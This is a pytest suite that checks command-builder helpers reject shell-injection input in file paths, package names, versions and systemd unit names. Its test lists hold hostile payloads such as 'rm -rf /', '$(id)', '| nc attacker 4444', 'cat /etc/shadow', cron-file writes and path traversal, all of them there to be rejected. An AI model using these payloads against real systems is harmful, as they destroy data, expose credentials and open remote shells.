"""Tests for command_builder safe-construction helpers (finding #10)."""

from __future__ import annotations

import pytest

from errander.execution.command_builder import (
    CommandBuildError,
    build_cmd,
    pkg_version_spec,
    safe_path,
    safe_pkg,
    safe_systemd_unit_name,
    safe_ver,
)


class TestSafePath:
    """safe_path() rejects shell metacharacters and quotes the rest."""

    def test_normal_path_passes_validation(self) -> None:
        result = safe_path("/var/log/syslog")
        # shlex.quote may or may not add quotes for safe paths — the key guarantee
        # is that safe_path does not raise and the path content is preserved.
        assert "/var/log/syslog" in result

    def test_path_with_spaces_is_quoted(self) -> None:
        result = safe_path("/var/log/my log")
        # shlex.quote ensures the result is one token (quoted)
        assert "/var/log/my log" in result

    def test_empty_path_raises(self) -> None:
        with pytest.raises(CommandBuildError):
            safe_path("")

    @pytest.mark.parametrize("payload", [
        "/tmp/; rm -rf /",
        "/tmp/$(whoami)",
        "/tmp/`id`",
        "/tmp/file|nc attacker 4444",
        "/tmp/{evil}",
        "/tmp/file && cat /etc/shadow",
        "/tmp/file > /etc/cron.d/evil",
    ])
    def test_injection_payloads_rejected(self, payload: str) -> None:
        with pytest.raises(CommandBuildError, match="metacharacter"):
            safe_path(payload)

    def test_path_with_hyphen_and_dot_ok(self) -> None:
        result = safe_path("/var/log/my-app.log")
        assert "my-app.log" in result


class TestSafePkg:
    """safe_pkg() validates package names against the allow-list pattern."""

    @pytest.mark.parametrize("name", [
        "curl", "nginx", "python3-pip", "lib32gcc-s1",
        "linux-image-5.15.0-1-amd64", "g++", "tzdata",
    ])
    def test_valid_package_names(self, name: str) -> None:
        assert safe_pkg(name) == name

    @pytest.mark.parametrize("payload", [
        "; rm -rf /",
        "pkg$(id)",
        "pkg`whoami`",
        "pkg|nc",
        "",
        "pkg name",    # space not allowed
        "pkg\x00null", # null byte
    ])
    def test_injection_corpus_rejected(self, payload: str) -> None:
        with pytest.raises(CommandBuildError):
            safe_pkg(payload)

    def test_epoch_colon_allowed(self) -> None:
        assert safe_pkg("2:vim") == "2:vim"

    def test_tilde_allowed(self) -> None:
        assert safe_pkg("1.0~rc1") == "1.0~rc1"


class TestSafeVer:
    """safe_ver() validates version strings."""

    @pytest.mark.parametrize("ver", [
        "7.81.0-1ubuntu1.10",
        "1:7.81.0",
        "2.4.41-4ubuntu3.14",
        "1.18.0",
    ])
    def test_valid_versions(self, ver: str) -> None:
        assert safe_ver(ver) == ver

    @pytest.mark.parametrize("payload", [
        "; rm -rf /",
        "1.0$(id)",
        "1.0 extra",
        "",
    ])
    def test_injection_corpus_rejected(self, payload: str) -> None:
        with pytest.raises(CommandBuildError):
            safe_ver(payload)


class TestPkgVersionSpec:
    """pkg_version_spec() assembles validated pkg=ver strings."""

    def test_normal_spec(self) -> None:
        assert pkg_version_spec("curl", "7.81.0") == "curl=7.81.0"

    def test_epoch_version(self) -> None:
        assert pkg_version_spec("vim", "2:8.2.0") == "vim=2:8.2.0"

    def test_unsafe_pkg_raises(self) -> None:
        with pytest.raises(CommandBuildError):
            pkg_version_spec("curl; rm -rf /", "7.81.0")

    def test_unsafe_ver_raises(self) -> None:
        with pytest.raises(CommandBuildError):
            pkg_version_spec("curl", "7.81.0$(id)")


class TestBuildCmd:
    """build_cmd() quotes all parts."""

    def test_simple_command(self) -> None:
        result = build_cmd(["apt-get", "install", "-y", "curl"])
        # shlex.quote wraps each token; the exact quote char is platform-dependent
        assert "apt-get" in result
        assert "install" in result
        assert "curl" in result

    def test_parts_with_spaces_quoted(self) -> None:
        result = build_cmd(["echo", "hello world"])
        assert "'hello world'" in result


class TestSafeSystemdUnitName:
    """safe_systemd_unit_name() enforces systemd unit grammar — P2-3 adversarial tests."""

    @pytest.mark.parametrize("unit", [
        "nginx.service",
        "cron.timer",
        "sshd.socket",
        "multi-user.target",
        "data.mount",
        "system-getty.slice",
        "getty@tty1.service",
        "dbus-org.freedesktop.network1.service",
    ])
    def test_valid_unit_names_accepted(self, unit: str) -> None:
        assert safe_systemd_unit_name(unit) == unit

    def test_empty_name_raises(self) -> None:
        with pytest.raises(CommandBuildError, match="empty"):
            safe_systemd_unit_name("")

    def test_name_without_type_suffix_raises(self) -> None:
        with pytest.raises(CommandBuildError, match="grammar"):
            safe_systemd_unit_name("nginx")

    def test_unknown_suffix_raises(self) -> None:
        with pytest.raises(CommandBuildError, match="grammar"):
            safe_systemd_unit_name("nginx.conf")

    @pytest.mark.parametrize("payload", [
        "nginx.service; rm -rf /",
        "nginx.service && cat /etc/shadow",
        "$(id).service",
        "`whoami`.service",
        "nginx.service|nc attacker 4444",
        "nginx.service > /etc/cron.d/evil",
        "nginx.service{evil}",
    ])
    def test_shell_injection_payloads_rejected(self, payload: str) -> None:
        """Adversarial inputs with shell metacharacters must be rejected."""
        with pytest.raises(CommandBuildError):
            safe_systemd_unit_name(payload)

    def test_path_traversal_rejected(self) -> None:
        with pytest.raises(CommandBuildError):
            safe_systemd_unit_name("../../etc/passwd.service")

    def test_null_byte_rejected(self) -> None:
        with pytest.raises(CommandBuildError):
            safe_systemd_unit_name("nginx\x00.service")
